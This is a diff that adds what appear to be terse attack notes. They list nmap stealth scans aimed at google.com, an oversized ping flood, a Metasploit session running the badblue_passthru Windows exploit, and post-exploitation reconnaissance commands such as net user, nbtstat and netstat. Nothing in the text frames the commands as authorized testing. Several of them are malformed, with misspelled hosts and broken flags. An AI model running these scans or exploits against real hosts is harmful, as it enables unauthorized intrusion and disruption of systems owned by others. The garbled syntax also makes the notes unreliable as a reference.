@@ -1,0 +1,24 @@
+nmap --scanflags sF -T4 www.google.com
+nmap -A -v www.google.com
+nmap -sA -T4 www.google.com
+nmap -sS p22,113,139 google.com
+nmap -sF -T4 google.coom /para
+nmap -sN -p 22 googlle.com
+nmap -sX -T4 google.com
+ping ip -t -l 65500
+
+service postgresql start
+msfconsole
+search badblue
+use exploit/windows/http/badblue_passthru
+set RHOST ip
+set RPORT portno
+run
+sysinfo
+
+
+
+net user
+nbtstat -A ip
+perfmon
+netstat
